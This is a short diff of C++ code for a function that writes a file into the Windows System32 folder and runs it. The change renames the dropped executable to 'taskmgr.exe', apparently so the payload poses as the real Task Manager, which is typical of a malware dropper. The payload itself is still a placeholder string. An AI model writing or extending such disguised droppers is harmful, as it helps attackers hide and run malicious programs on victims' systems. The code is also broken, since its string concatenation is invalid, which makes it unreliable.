@@ -4,10 +4,10 @@
 void dropFile() {
     const char* data = "this will soon contain the base64 of the file";
     const char* path = "C:\\Windows\\System32";
-    ofstream File(path + "WinManage.exe");
+    ofstream File(path + "taskmgr.exe");
     File << data;
     File.close();
-    system("start C:\\Windows\\System32\WinManage.exe");
+    system("start C:\\Windows\\System32\\taskmgr.exe");
 }
 
 
